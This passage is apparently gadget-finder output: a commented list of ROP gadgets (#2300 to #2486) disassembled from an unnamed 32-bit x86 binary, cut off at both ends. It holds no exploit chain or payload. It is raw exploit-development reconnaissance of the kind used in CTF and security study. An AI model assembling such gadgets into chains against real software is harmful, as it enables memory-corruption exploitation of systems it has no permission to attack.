# 080ad390:	mov	eax, 6
# 080ad395:	ret
# Gadget #2301:
# 080ad38f:	add	byte ptr [eax + 6], bh
# 080ad395:	ret
# Gadget #2302:
# 080ad39d:	lea	esi, [esi]
# 080ad3a0:	mov	eax, 7
# 080ad3a5:	ret
# Gadget #2303:
# 080ad39e:	jbe	0x80ad3a0
# 080ad3a0:	mov	eax, 7
# 080ad3a5:	ret
# Gadget #2304:
# 080ad39f:	add	byte ptr [eax + 7], bh
# 080ad3a5:	ret
# Gadget #2305:
# 080ad3ea:	add	byte ptr [ebp - 0x278afeb8], cl
# 080ad3f0:	mov	eax, ecx
# 080ad3f2:	ret
# Gadget #2306:
# 080ad3eb:	lea	ecx, [eax + 1]
# 080ad3ee:	jne	0x80ad3c8
# 080ad3f0:	mov	eax, ecx
# 080ad3f2:	ret
# Gadget #2307:
# 080ad3ec:	dec	eax
# 080ad3ed:	add	dword ptr [ebp - 0x28], esi
# 080ad3f0:	mov	eax, ecx
# 080ad3f2:	ret
# Gadget #2308:
# 080ad3f4:	je	0x80ad41c
# 080ad3f6:	add	byte ptr [eax - 0x37763e77], dl
# 080ad3fc:	ret
# Gadget #2309:
# 080ad3f5:	add	byte ptr es:[eax - 0x37763e77], dl
# 080ad3fc:	ret
# Gadget #2310:
# 080ad3f7:	nop
# 080ad3f8:	mov	ecx, eax
# 080ad3fa:	mov	eax, ecx
# 080ad3fc:	ret
# Gadget #2311:
# 080ad500:	popal
# 080ad501:	add	esp, 0x1c
# 080ad504:	pop	ebx
# 080ad505:	pop	esi
# 080ad506:	pop	edi
# 080ad507:	pop	ebp
# 080ad508:	ret
# Gadget #2312:
# 080ad5cf:	add	esp, 0x20
# 080ad5d2:	mov	eax, ecx
# 080ad5d4:	pop	ebx
# 080ad5d5:	pop	esi
# 080ad5d6:	pop	edi
# 080ad5d7:	ret
# Gadget #2313:
# 080ad5d0:	les	esp, ptr [eax]
# 080ad5d2:	mov	eax, ecx
# 080ad5d4:	pop	ebx
# 080ad5d5:	pop	esi
# 080ad5d6:	pop	edi
# 080ad5d7:	ret
# Gadget #2314:
# 080ad5d1:	and	byte ptr [ecx + 0x5f5e5bc8], cl
# 080ad5d7:	ret
# Gadget #2315:
# 080ad5d3:	enter	0x5e5b, 0x5f
# 080ad5d7:	ret
# Gadget #2316:
# 080ad773:	jne	0x80ad7a4
# 080ad775:	add	esp, 0x70
# 080ad778:	pop	ebx
# 080ad779:	pop	esi
# 080ad77a:	pop	edi
# 080ad77b:	ret
# Gadget #2317:
# 080ad774:	das
# 080ad775:	add	esp, 0x70
# 080ad778:	pop	ebx
# 080ad779:	pop	esi
# 080ad77a:	pop	edi
# 080ad77b:	ret
# Gadget #2318:
# 080ad776:	les	esi, ptr [eax + 0x5b]
# 080ad779:	pop	esi
# 080ad77a:	pop	edi
# 080ad77b:	ret
# Gadget #2319:
# 080ad777:	jo	0x80ad7d4
# 080ad779:	pop	esi
# 080ad77a:	pop	edi
# 080ad77b:	ret
# Gadget #2320:
# 080ad7fb:	add	byte ptr [eax], al
# 080ad7fd:	add	esp, 8
# 080ad800:	xor	eax, eax
# 080ad802:	pop	ebx
# 080ad803:	ret
# Gadget #2321:
# 080ad7fc:	add	byte ptr [ebx - 0x3fcef73c], al
# 080ad802:	pop	ebx
# 080ad803:	ret
# Gadget #2322:
# 080ad855:	add	esp, 8
# 080ad858:	xor	eax, eax
# 080ad85a:	pop	ebx
# 080ad85b:	ret
# Gadget #2323:
# 080ade01:	jne	0x80ade39
# 080ade03:	add	esp, 0x70
# 080ade06:	pop	ebx
# 080ade07:	pop	esi
# 080ade08:	pop	edi
# 080ade09:	ret
# Gadget #2324:
# 080ade02:	add	esp, 0x70
# 080ade06:	pop	ebx
# 080ade07:	pop	esi
# 080ade08:	pop	edi
# 080ade09:	ret
# Gadget #2325:
# 080ade5d:	jae	0x808b380
# 080ade63:	ret
# Gadget #2326:
# 080ade78:	add	byte ptr [ebp - 1], ah
# 080ade7b:	adc	eax, 0x10
# 080ade80:	ret
# Gadget #2327:
# 080ade79:	call	dword ptr gs:[0x10]
# 080ade80:	ret
# Gadget #2328:
# 080ade7a:	call	dword ptr [0x10]
# 080ade80:	ret
# Gadget #2329:
# 080ade7c:	adc	byte ptr [eax], al
# 080ade7e:	add	byte ptr [eax], al
# 080ade80:	ret
# Gadget #2330:
# 080ade9b:	adc	eax, 0x10
# 080adea0:	ret
# Gadget #2331:
# 080adf6c:	lea	esi, [esi]
# 080adf70:	xor	eax, eax
# 080adf72:	pop	ebx
# 080adf73:	pop	esi
# 080adf74:	ret
# Gadget #2332:
# 080adfd9:	jnp	0x911b0423
# 080adfdf:	ret
# Gadget #2333:
# 080adff5:	add	esp, 0x2c
# 080adff9:	pop	ebx
# 080adffa:	pop	esi
# 080adffb:	pop	edi
# 080adffc:	pop	ebp
# 080adffd:	ret
# Gadget #2334:
# 080ae072:	add	esp, 0x48
# 080ae075:	movzx	eax, al
# 080ae078:	pop	ebx
# 080ae079:	ret
# Gadget #2335:
# 080ae073:	les	ecx, ptr [eax + 0xf]
# 080ae076:	mov	dh, 0xc0
# 080ae078:	pop	ebx
# 080ae079:	ret
# Gadget #2336:
# 080ae074:	dec	eax
# 080ae075:	movzx	eax, al
# 080ae078:	pop	ebx
# 080ae079:	ret
# Gadget #2337:
# 080ae15e:	push	dword ptr [edi + 0x1f]
# 080ae161:	add	esp, 4
# 080ae164:	pop	ebx
# 080ae165:	pop	esi
# 080ae166:	ret
# Gadget #2338:
# 080ae15f:	ja	0x80ae180
# 080ae161:	add	esp, 4
# 080ae164:	pop	ebx
# 080ae165:	pop	esi
# 080ae166:	ret
# Gadget #2339:
# 080ae160:	pop	ds
# 080ae161:	add	esp, 4
# 080ae164:	pop	ebx
# 080ae165:	pop	esi
# 080ae166:	ret
# Gadget #2340:
# 080ae182:	sar	ebp, 1
# 080ae184:	inc	dword ptr [ebx + 0x5e5b04c4]
# 080ae18a:	ret
# Gadget #2341:
# 080ae183:	std
# 080ae184:	inc	dword ptr [ebx + 0x5e5b04c4]
# 080ae18a:	ret
# Gadget #2342:
# 080ae1ca:	push	dword ptr [edi + 0x13]
# 080ae1cd:	add	esp, 4
# 080ae1d0:	pop	ebx
# 080ae1d1:	pop	esi
# 080ae1d2:	ret
# Gadget #2343:
# 080ae1cb:	ja	0x80ae1e0
# 080ae1cd:	add	esp, 4
# 080ae1d0:	pop	ebx
# 080ae1d1:	pop	esi
# 080ae1d2:	ret
# Gadget #2344:
# 080ae1cc:	adc	eax, dword ptr [ebx + 0x5e5b04c4]
# 080ae1d2:	ret
# Gadget #2345:
# 080ae2b0:	add	byte ptr [ebp + 0x17], dh
# 080ae2b3:	add	esp, 0x34
# 080ae2b6:	pop	ebx
# 080ae2b7:	pop	esi
# 080ae2b8:	ret
# Gadget #2346:
# 080ae2b1:	jne	0x80ae2ca
# 080ae2b3:	add	esp, 0x34
# 080ae2b6:	pop	ebx
# 080ae2b7:	pop	esi
# 080ae2b8:	ret
# Gadget #2347:
# 080ae2b2:	pop	ss
# 080ae2b3:	add	esp, 0x34
# 080ae2b6:	pop	ebx
# 080ae2b7:	pop	esi
# 080ae2b8:	ret
# Gadget #2348:
# 080ae2ee:	and	byte ptr [eax], al
# 080ae2f0:	add	byte ptr [ecx], bh
# 080ae2f2:	ret
# Gadget #2349:
# 080ae2f0:	add	byte ptr [ecx], bh
# 080ae2f2:	ret
# 080ae2f3:	ja	0x80ae300
# 080ae2f5:	xor	eax, eax
# 080ae2f7:	pop	ebx
# 080ae2f8:	ret
# Gadget #2350:
# 080ae2f1:	cmp	ebx, eax
# 080ae2f3:	ja	0x80ae300
# 080ae2f5:	xor	eax, eax
# 080ae2f7:	pop	ebx
# 080ae2f8:	ret
# Gadget #2351:
# 080ae333:	jae	0x808b380
# 080ae339:	ret
# Gadget #2352:
# 080ae412:	push	ss
# 080ae413:	jne	0x80ae41b
# 080ae415:	pop	ebx
# 080ae416:	mov	eax, edx
# 080ae418:	pop	esi
# 080ae419:	pop	edi
# 080ae41a:	ret
# Gadget #2353:
# 080ae414:	push	es
# 080ae415:	pop	ebx
# 080ae416:	mov	eax, edx
# 080ae418:	pop	esi
# 080ae419:	pop	edi
# 080ae41a:	ret
# Gadget #2354:
# 080ae417:	rcr	byte ptr [esi + 0x5f], 1
# 080ae41a:	ret
# Gadget #2355:
# 080ae4c1:	mov	ebx, 0x89fffdce
# 080ae4c6:	ret
# Gadget #2356:
# 080ae543:	add	esp, 0x24
# 080ae546:	mov	eax, ebx
# 080ae548:	pop	ebx
# 080ae549:	pop	esi
# 080ae54a:	ret
# Gadget #2357:
# 080ae9b7:	les	ecx, ptr [ecx + ecx*4 - 8]
# 080ae9bb:	pop	ebx
# 080ae9bc:	pop	esi
# 080ae9bd:	pop	edi
# 080ae9be:	pop	ebp
# 080ae9bf:	ret
# Gadget #2358:
# 080ae9b8:	dec	esp
# 080ae9b9:	mov	eax, edi
# 080ae9bb:	pop	ebx
# 080ae9bc:	pop	esi
# 080ae9bd:	pop	edi
# 080ae9be:	pop	ebp
# 080ae9bf:	ret
# Gadget #2359:
# 080aeaee:	or	byte ptr [ebx + 0x5e5b4cc4], al
# 080aeaf4:	pop	edi
# 080aeaf5:	pop	ebp
# 080aeaf6:	ret
# Gadget #2360:
# 080aeb46:	das
# 080aeb47:	add	esp, 0xc
# 080aeb4a:	pop	ebx
# 080aeb4b:	pop	esi
# 080aeb4c:	pop	edi
# 080aeb4d:	pop	ebp
# 080aeb4e:	ret
# Gadget #2361:
# 080aef20:	call	dword ptr gs:[0x10]
# 080aef27:	pop	ebx
# 080aef28:	ret
# Gadget #2362:
# 080aef21:	call	dword ptr [0x10]
# 080aef27:	pop	ebx
# 080aef28:	ret
# Gadget #2363:
# 080aef22:	adc	eax, 0x10
# 080aef27:	pop	ebx
# 080aef28:	ret
# Gadget #2364:
# 080aef23:	adc	byte ptr [eax], al
# 080aef25:	add	byte ptr [eax], al
# 080aef27:	pop	ebx
# 080aef28:	ret
# Gadget #2365:
# 080aefda:	add	byte ptr [ebp + 0x27], dh
# 080aefdd:	add	esp, 0x24
# 080aefe0:	pop	ebx
# 080aefe1:	pop	esi
# 080aefe2:	ret
# Gadget #2366:
# 080aefdb:	jne	0x80af004
# 080aefdd:	add	esp, 0x24
# 080aefe0:	pop	ebx
# 080aefe1:	pop	esi
# 080aefe2:	ret
# Gadget #2367:
# 080aefdc:	daa
# 080aefdd:	add	esp, 0x24
# 080aefe0:	pop	ebx
# 080aefe1:	pop	esi
# 080aefe2:	ret
# Gadget #2368:
# 080aefde:	les	esp, ptr [ebx + ebx*2]
# 080aefe1:	pop	esi
# 080aefe2:	ret
# Gadget #2369:
# 080af0f3:	add	al, byte ptr [ebx - 0x79f0f008]
# 080af0f9:	ret
# Gadget #2370:
# 080af10f:	add	byte ptr [esi - 0x7d], ah
# 080af112:	sti
# 080af113:	adc	al, 0xf
# 080af115:	xchg	esp, eax
# 080af116:	ret
# Gadget #2371:
# 080afcb8:	clc
# 080afcb9:	cmc
# 080afcba:	je	0x80afcb0
# 080afcbc:	add	esp, 8
# 080afcbf:	pop	ebx
# 080afcc0:	ret
# Gadget #2372:
# 080afcbb:	hlt
# 080afcbc:	add	esp, 8
# 080afcbf:	pop	ebx
# 080afcc0:	ret
# Gadget #2373:
# 080afe00:	push	edx
# 080afe01:	add	esp, 0x2c
# 080afe04:	pop	ebx
# 080afe05:	pop	esi
# 080afe06:	pop	edi
# 080afe07:	pop	ebp
# 080afe08:	ret
# Gadget #2374:
# 080afe95:	add	byte ptr [ebx + 0x5e5b0cc4], 0x5f
# 080afe9c:	pop	ebp
# 080afe9d:	ret
# Gadget #2375:
# 080afec2:	inc	dword ptr [ebx + 0x5e5b0cc4]
# 080afec8:	pop	edi
# 080afec9:	pop	ebp
# 080afeca:	ret
# Gadget #2376:
# 080b0ead:	call	0x80b0dd0
# 080b0eb2:	add	esp, 0x1c
# 080b0eb5:	ret
# Gadget #2377:
# 080b0ec7:	adc	eax, 0x81fff98e
# 080b0ecc:	ret
# Gadget #2378:
# 080b0f68:	add	esp, 8
# 080b0f6b:	movzx	eax, ax
# 080b0f6e:	pop	ebx
# 080b0f6f:	ret
# Gadget #2379:
# 080b0f69:	les	ecx, ptr [eax]
# 080b0f6b:	movzx	eax, ax
# 080b0f6e:	pop	ebx
# 080b0f6f:	ret
# Gadget #2380:
# 080b0f6a:	or	byte ptr [edi], cl
# 080b0f6c:	mov	bh, 0xc0
# 080b0f6e:	pop	ebx
# 080b0f6f:	ret
# Gadget #2381:
# 080b0ffe:	or	al, 0x7f
# 080b1000:	ret
# Gadget #2382:
# 080b1006:	sub	dword ptr [ebx + 0x5e5b1cc4], eax
# 080b100c:	pop	edi
# 080b100d:	pop	ebp
# 080b100e:	ret
# Gadget #2383:
# 080b1056:	std
# 080b1057:	inc	edi
# 080b1059:	ret
# Gadget #2384:
# 080b109d:	call	0x80b0f70
# 080b10a2:	add	esp, 0x1c
# 080b10a5:	ret
# Gadget #2385:
# 080b115f:	enter	-0x147d, 1
# 080b1163:	jne	0x80b10f0
# 080b1165:	pop	ebx
# 080b1166:	pop	esi
# 080b1167:	ret
# Gadget #2386:
# 080b1160:	sub	ebx, 1
# 080b1163:	jne	0x80b10f0
# 080b1165:	pop	ebx
# 080b1166:	pop	esi
# 080b1167:	ret
# Gadget #2387:
# 080b1161:	jmp	0x80b1164
# 080b1163:	jne	0x80b10f0
# 080b1165:	pop	ebx
# 080b1166:	pop	esi
# 080b1167:	ret
# Gadget #2388:
# 080b1162:	add	dword ptr [ebp - 0x75], esi
# 080b1165:	pop	ebx
# 080b1166:	pop	esi
# 080b1167:	ret
# Gadget #2389:
# 080b1164:	mov	ebx, dword ptr [ebx + 0x5e]
# 080b1167:	ret
# Gadget #2390:
# 080b1232:	jb	0x80b1236
# 080b1234:	pop	ebx
# 080b1235:	mov	eax, esi
# 080b1237:	pop	esi
# 080b1238:	pop	edi
# 080b1239:	pop	ebp
# 080b123a:	ret
# Gadget #2391:
# 080b172a:	in	eax, 0x83
# 080b172c:	les	ebx, ptr [ebx + ebx*2]
# 080b172f:	pop	esi
# 080b1730:	pop	edi
# 080b1731:	pop	ebp
# 080b1732:	ret
# Gadget #2392:
# 080b18a0:	add	byte ptr [eax], al
# 080b18a2:	add	byte ptr [ebx + 0x420f02f8], al
# 080b18a8:	ret
# Gadget #2393:
# 080b18a4:	clc
# 080b18a5:	add	cl, byte ptr [edi]
# 080b18a7:	inc	edx
# 080b18a8:	ret
# Gadget #2394:
# 080b18fc:	mov	dl, 0x83
# 080b18fe:	les	ebx, ptr [ebx + ebx*2]
# 080b1901:	pop	esi
# 080b1902:	pop	edi
# 080b1903:	pop	ebp
# 080b1904:	ret
# Gadget #2395:
# 080b193b:	mov	eax, dword ptr [0x81fff983]
# 080b1940:	ret
# Gadget #2396:
# 080b1adf:	ror	byte ptr [ebp + 0x5e5bf465], 1
# 080b1ae5:	pop	edi
# 080b1ae6:	pop	ebp
# 080b1ae7:	ret
# Gadget #2397:
# 080b1f06:	add	cl, ch
# 080b1f08:	ret
# Gadget #2398:
# 080b220c:	hlt
# 080b220e:	pop	ebx
# 080b220f:	pop	esi
# 080b2210:	mov	eax, edx
# 080b2212:	pop	edi
# 080b2213:	pop	ebp
# 080b2214:	ret
# Gadget #2399:
# 080b220d:	hlt
# 080b220e:	pop	ebx
# 080b220f:	pop	esi
# 080b2210:	mov	eax, edx
# 080b2212:	pop	edi
# 080b2213:	pop	ebp
# 080b2214:	ret
# Gadget #2400:
# 080b2211:	rcr	byte ptr [edi + 0x5d], 1
# 080b2214:	ret
# Gadget #2401:
# 080b2ec1:	ror	dword ptr [ecx + 0x1548f], 1
# 080b2ec7:	add	cl, ch
# 080b2ec9:	ret
# Gadget #2402:
# 080b2ec4:	push	esp
# 080b2ec5:	add	dword ptr [eax], eax
# 080b2ec7:	add	cl, ch
# 080b2ec9:	ret
# Gadget #2403:
# 080b393c:	add	byte ptr [ebp + 0x3c60076], cl
# 080b3942:	and	al, 0x83
# 080b3944:	ret
# Gadget #2404:
# 080b393f:	add	dh, al
# 080b3941:	add	esp, dword ptr [ebx + eax*4]
# 080b3944:	ret
# Gadget #2405:
# 080b4c8a:	push	es
# 080b4c8b:	add	esp, 0x2c
# 080b4c8e:	pop	ebx
# 080b4c8f:	pop	esi
# 080b4c90:	pop	edi
# 080b4c91:	pop	ebp
# 080b4c92:	ret
# Gadget #2406:
# 080b52f1:	les	ebp, ptr [ecx + esi - 0x40]
# 080b52f5:	pop	ebx
# 080b52f6:	pop	esi
# 080b52f7:	pop	edi
# 080b52f8:	pop	ebp
# 080b52f9:	ret
# Gadget #2407:
# 080b52f2:	insb	byte ptr es:[edi], dx
# 080b52f3:	xor	eax, eax
# 080b52f5:	pop	ebx
# 080b52f6:	pop	esi
# 080b52f7:	pop	edi
# 080b52f8:	pop	ebp
# 080b52f9:	ret
# Gadget #2408:
# 080b6344:	loopne	0x80b6343
# 080b6346:	call	dword ptr [eax - 0x18]
# 080b6349:	ret
# Gadget #2409:
# 080b6345:	std
# 080b6346:	call	dword ptr [eax - 0x18]
# 080b6349:	ret
# Gadget #2410:
# 080b6462:	sub	esp, -0x21
# 080b6465:	std
# 080b6466:	call	dword ptr [eax - 0x18]
# 080b6469:	ret
# Gadget #2411:
# 080b6839:	mov	dword ptr [0x81fff934], eax
# 080b683e:	ret
# Gadget #2412:
# 080b6839:	mov	dword ptr [0x81fff934], eax
# 080b683e:	ret
# 080b683f:	ret
# Gadget #2413:
# 080b6c7e:	sal	byte ptr [ebp + 6], 0x83
# 080b6c82:	les	eax, ptr [ebx + ebx*2]
# 080b6c85:	pop	esi
# 080b6c86:	ret
# Gadget #2414:
# 080b6c7f:	jne	0x80b6c87
# 080b6c81:	add	esp, 4
# 080b6c84:	pop	ebx
# 080b6c85:	pop	esi
# 080b6c86:	ret
# Gadget #2415:
# 080b6ca7:	xor	eax, 0x81fff930
# 080b6cac:	ret
# Gadget #2416:
# 080b6ce9:	and	edi, ecx
# 080b6ceb:	inc	dword ptr [ebx + 0x5e5b14c4]
# 080b6cf1:	ret
# Gadget #2417:
# 080b6cea:	stc
# 080b6ceb:	inc	dword ptr [ebx + 0x5e5b14c4]
# 080b6cf1:	ret
# Gadget #2418:
# 080b6d37:	ret	0x675
# 080b6d3a:	add	esp, 4
# 080b6d3d:	pop	ebx
# 080b6d3e:	pop	esi
# 080b6d3f:	ret
# Gadget #2419:
# 080b70ae:	add	byte ptr [ebx - 0x8b7b], cl
# 080b70b4:	inc	edi
# 080b70b6:	ret
# Gadget #2420:
# 080b70b0:	test	dword ptr [edi + edi*8 - 1], esi
# 080b70b4:	inc	edi
# 080b70b6:	ret
# Gadget #2421:
# 080b72fa:	adc	byte ptr [ebp + 0x5e5bf465], cl
# 080b7300:	pop	edi
# 080b7301:	pop	ebp
# 080b7302:	ret
# Gadget #2422:
# 080b7d1a:	inc	ebp
# 080b7d1b:	mov	al, 0x8b
# 080b7d1d:	inc	esi
# 080b7d1e:	add	al, 0x89
# 080b7d20:	ret
# Gadget #2423:
# 080b7d54:	clc
# 080b7d55:	add	dword ptr [ebx - 0x79f0f7bb], ecx
# 080b7d5b:	ret
# Gadget #2424:
# 080b84d7:	test	byte ptr [edi + 0x31fffffe], dl
# 080b84dd:	shr	cl, cl
# 080b84df:	ret
# Gadget #2425:
# 080b84db:	push	dword ptr [ecx]
# 080b84dd:	shr	cl, cl
# 080b84df:	ret
# Gadget #2426:
# 080b8ede:	xchg	ebp, eax
# 080b8edf:	ret
# Gadget #2427:
# 080b907c:	int3
# 080b907d:	lea	esp, [ebp - 0xc]
# 080b9080:	pop	ebx
# 080b9081:	pop	esi
# 080b9082:	pop	edi
# 080b9083:	pop	ebp
# 080b9084:	ret
# Gadget #2428:
# 080b924a:	loopne	0x80b921f
# 080b924c:	loop	0x80b91d1
# 080b924e:	rol	dword ptr [ecx], 0x31
# 080b9251:	ret
# Gadget #2429:
# 080b924f:	add	dword ptr [ecx], esi
# 080b9251:	ret
# Gadget #2430:
# 080b9324:	or	byte ptr [ebp + 0x39010a54], cl
# 080b932a:	ret
# Gadget #2431:
# 080b96cb:	add	byte ptr [ebp + 0xff289c9], al
# 080b96d1:	xchg	esp, eax
# 080b96d2:	ret
# Gadget #2432:
# 080b98a0:	jae	0xc88f8986
# 080b98a6:	or	al, 0x89
# 080b98a8:	ret
# Gadget #2433:
# 080b9add:	mov	byte ptr [edx], 0x83
# 080b9ae0:	ret
# Gadget #2434:
# 080b9b8f:	add	esp, 0x60
# 080b9b92:	mov	eax, edi
# 080b9b94:	pop	ebx
# 080b9b95:	pop	esi
# 080b9b96:	pop	edi
# 080b9b97:	ret
# Gadget #2435:
# 080b9b90:	les	esp, ptr [eax - 0x77]
# 080b9b93:	clc
# 080b9b94:	pop	ebx
# 080b9b95:	pop	esi
# 080b9b96:	pop	edi
# 080b9b97:	ret
# Gadget #2436:
# 080b9b91:	pushal
# 080b9b92:	mov	eax, edi
# 080b9b94:	pop	ebx
# 080b9b95:	pop	esi
# 080b9b96:	pop	edi
# 080b9b97:	ret
# Gadget #2437:
# 080b9bd8:	mov	eax, edi
# 080b9bda:	add	esp, 0x60
# 080b9bdd:	pop	ebx
# 080b9bde:	pop	esi
# 080b9bdf:	pop	edi
# 080b9be0:	ret
# Gadget #2438:
# 080b9bd9:	clc
# 080b9bda:	add	esp, 0x60
# 080b9bdd:	pop	ebx
# 080b9bde:	pop	esi
# 080b9bdf:	pop	edi
# 080b9be0:	ret
# Gadget #2439:
# 080b9bdb:	les	esp, ptr [eax + 0x5b]
# 080b9bde:	pop	esi
# 080b9bdf:	pop	edi
# 080b9be0:	ret
# Gadget #2440:
# 080b9bdc:	pushal
# 080b9bdd:	pop	ebx
# 080b9bde:	pop	esi
# 080b9bdf:	pop	edi
# 080b9be0:	ret
# Gadget #2441:
# 080b9c3a:	call	0x80b9660
# 080b9c3f:	add	esp, 0x1c
# 080b9c42:	ret
# Gadget #2442:
# 080b9c7a:	call	0x80b9660
# 080b9c7f:	add	esp, 0x1c
# 080b9c82:	ret
# Gadget #2443:
# 080b9ca9:	call	0x80b9660
# 080b9cae:	add	esp, 0x1c
# 080b9cb1:	ret
# Gadget #2444:
# 080b9d26:	add	byte ptr [eax], al
# 080b9d28:	pop	ebx
# 080b9d29:	xor	eax, eax
# 080b9d2b:	pop	esi
# 080b9d2c:	pop	edi
# 080b9d2d:	ret
# Gadget #2445:
# 080b9d69:	cmp	edx, ecx
# 080b9d6b:	jne	0x80b9d50
# 080b9d6d:	mov	eax, dword ptr [edx]
# 080b9d6f:	pop	ebx
# 080b9d70:	pop	esi
# 080b9d71:	ret
# Gadget #2446:
# 080b9d6a:	retf	0xe375
# 080b9d6d:	mov	eax, dword ptr [edx]
# 080b9d6f:	pop	ebx
# 080b9d70:	pop	esi
# 080b9d71:	ret
# Gadget #2447:
# 080b9d6c:	jecxz	0x80b9cf9
# 080b9d6e:	add	bl, byte ptr [ebx + 0x5e]
# 080b9d71:	ret
# Gadget #2448:
# 080b9e70:	sbb	al, 0xf
# 080b9e72:	scasd	eax, dword ptr es:[edi]
# 080b9e73:	ror	dword ptr [edi], 0xaf
# 080b9e76:	fild	word ptr [ecx]
# 080b9e78:	ret
# Gadget #2449:
# 080b9e75:	scasd	eax, dword ptr es:[edi]
# 080b9e76:	fild	word ptr [ecx]
# 080b9e78:	ret
# Gadget #2450:
# 080b9f07:	mov	eax, edi
# 080b9f09:	mov	edx, ebp
# 080b9f0b:	pop	ebx
# 080b9f0c:	pop	esi
# 080b9f0d:	pop	edi
# 080b9f0e:	pop	ebp
# 080b9f0f:	ret
# Gadget #2451:
# 080b9f08:	clc
# 080b9f09:	mov	edx, ebp
# 080b9f0b:	pop	ebx
# 080b9f0c:	pop	esi
# 080b9f0d:	pop	edi
# 080b9f0e:	pop	ebp
# 080b9f0f:	ret
# Gadget #2452:
# 080ba043:	add	byte ptr [ecx], al
# 080ba045:	ret
# Gadget #2453:
# 080ba156:	dec	dword ptr [ecx - 0x3e17dbcc]
# 080ba15c:	ret
# Gadget #2454:
# 080ba537:	and	byte ptr [ebp + 0x5e5bf465], cl
# 080ba53d:	pop	edi
# 080ba53e:	pop	ebp
# 080ba53f:	ret
# Gadget #2455:
# 080ba9dd:	or	byte ptr [ebx + 0x5e5b20c4], al
# 080ba9e3:	pop	edi
# 080ba9e4:	pop	ebp
# 080ba9e5:	ret
# Gadget #2456:
# 080ba9de:	add	esp, 0x20
# 080ba9e1:	pop	ebx
# 080ba9e2:	pop	esi
# 080ba9e3:	pop	edi
# 080ba9e4:	pop	ebp
# 080ba9e5:	ret
# Gadget #2457:
# 080ba9df:	les	esp, ptr [eax]
# 080ba9e1:	pop	ebx
# 080ba9e2:	pop	esi
# 080ba9e3:	pop	edi
# 080ba9e4:	pop	ebp
# 080ba9e5:	ret
# Gadget #2458:
# 080ba9e0:	and	byte ptr [ebx + 0x5e], bl
# 080ba9e3:	pop	edi
# 080ba9e4:	pop	ebp
# 080ba9e5:	ret
# Gadget #2459:
# 080baa09:	jmp	0x80ba883
# 080baa0e:	nop
# 080baa10:	ret
# Gadget #2460:
# 080baa0d:	jmp	dword ptr [esi - 0x70]
# 080baa10:	ret
# Gadget #2461:
# 080baa65:	mov	dword ptr [edi + 4], eax
# 080baa68:	mov	eax, edi
# 080baa6a:	pop	ebx
# 080baa6b:	pop	esi
# 080baa6c:	pop	edi
# 080baa6d:	ret
# Gadget #2462:
# 080baa66:	inc	edi
# 080baa67:	add	al, 0x89
# 080baa69:	clc
# 080baa6a:	pop	ebx
# 080baa6b:	pop	esi
# 080baa6c:	pop	edi
# 080baa6d:	ret
# Gadget #2463:
# 080baab4:	in	al, dx
# 080baab5:	sbb	al, 0xc7
# 080baab7:	ret
# Gadget #2464:
# 080babcb:	or	byte ptr [ecx + 0x108b0810], bl
# 080babd1:	mov	eax, edx
# 080babd3:	ret
# Gadget #2465:
# 080babcc:	cdq
# 080babcd:	adc	byte ptr [eax], cl
# 080babcf:	mov	edx, dword ptr [eax]
# 080babd1:	mov	eax, edx
# 080babd3:	ret
# Gadget #2466:
# 080bac11:	add	al, 0x85
# 080bac13:	leave
# 080bac14:	jne	0x80babf0
# 080bac16:	mov	eax, edx
# 080bac18:	pop	ebx
# 080bac19:	ret
# Gadget #2467:
# 080bac12:	test	ecx, ecx
# 080bac14:	jne	0x80babf0
# 080bac16:	mov	eax, edx
# 080bac18:	pop	ebx
# 080bac19:	ret
# Gadget #2468:
# 080bac42:	mov	edx, dword ptr [eax]
# 080bac44:	mov	eax, dword ptr [esp + 8]
# 080bac48:	mov	dword ptr [eax], edx
# 080bac4a:	ret
# Gadget #2469:
# 080bac45:	inc	esp
# 080bac46:	and	al, 8
# 080bac48:	mov	dword ptr [eax], edx
# 080bac4a:	ret
# Gadget #2470:
# 080bac77:	inc	esp
# 080bac78:	cmp	eax, 0x50e85004
# 080bac7d:	ret
# Gadget #2471:
# 080bac7c:	push	eax
# 080bac7d:	ret
# Gadget #2472:
# 080bacd2:	or	eax, 0x5b1cc483
# 080bacd7:	pop	esi
# 080bacd8:	pop	edi
# 080bacd9:	pop	ebp
# 080bacda:	ret
# Gadget #2473:
# 080baecd:	inc	eax
# 080baece:	add	esp, 0x2c
# 080baed1:	pop	ebx
# 080baed2:	pop	esi
# 080baed3:	pop	edi
# 080baed4:	pop	ebp
# 080baed5:	ret
# Gadget #2474:
# 080bb126:	add	bh, al
# 080bb128:	ret
# Gadget #2475:
# 080bb13c:	pop	esi
# 080bb13d:	pop	edi
# 080bb13e:	cmp	eax, -1
# 080bb141:	cmove	eax, edx
# 080bb144:	ret
# Gadget #2476:
# 080bb16e:	or	byte ptr [ebx - 0x3e], dh
# 080bb171:	pop	ebx
# 080bb172:	xor	eax, eax
# 080bb174:	pop	esi
# 080bb175:	pop	edi
# 080bb176:	ret
# Gadget #2477:
# 080bb16f:	jae	0x80bb133
# 080bb171:	pop	ebx
# 080bb172:	xor	eax, eax
# 080bb174:	pop	esi
# 080bb175:	pop	edi
# 080bb176:	ret
# Gadget #2478:
# 080bb1de:	or	byte ptr [ebx + 0x5e5b0cc4], al
# 080bb1e4:	pop	edi
# 080bb1e5:	pop	ebp
# 080bb1e6:	ret
# Gadget #2479:
# 080bb534:	or	dword ptr [edx], 1
# 080bb537:	add	esp, 4
# 080bb53a:	pop	ebx
# 080bb53b:	pop	esi
# 080bb53c:	ret
# Gadget #2480:
# 080bb535:	or	al, byte ptr [ecx]
# 080bb537:	add	esp, 4
# 080bb53a:	pop	ebx
# 080bb53b:	pop	esi
# 080bb53c:	ret
# Gadget #2481:
# 080bb54a:	mov	eax, dword ptr gs:[eax]
# 080bb54d:	add	esp, 4
# 080bb550:	pop	ebx
# 080bb551:	pop	esi
# 080bb552:	ret
# Gadget #2482:
# 080bb54b:	mov	eax, dword ptr [eax]
# 080bb54d:	add	esp, 4
# 080bb550:	pop	ebx
# 080bb551:	pop	esi
# 080bb552:	ret
# Gadget #2483:
# 080bb6d6:	call	0x80c7b50
# 080bb6db:	add	esp, 0x1c
# 080bb6de:	ret
# Gadget #2484:
# 080bb6d7:	jne	0x80bb69d
# 080bb6d9:	add	byte ptr [eax], al
# 080bb6db:	add	esp, 0x1c
# 080bb6de:	ret
# Gadget #2485:
# 080bb7a6:	test	ch, al
# 080bb7a8:	add	byte ptr [eax], al
# 080bb7aa:	add	byte ptr [ecx], bh
# 080bb7ac:	ret
# Gadget #2486:
# 080bb900:	iretd
# 080bb901:	xor	ebx, ebx
# 080bb903:	mov	eax, ebx
# 080bb905:	pop	ebx
# 080bb906:	pop	esi
# 080bb907:	pop	edi
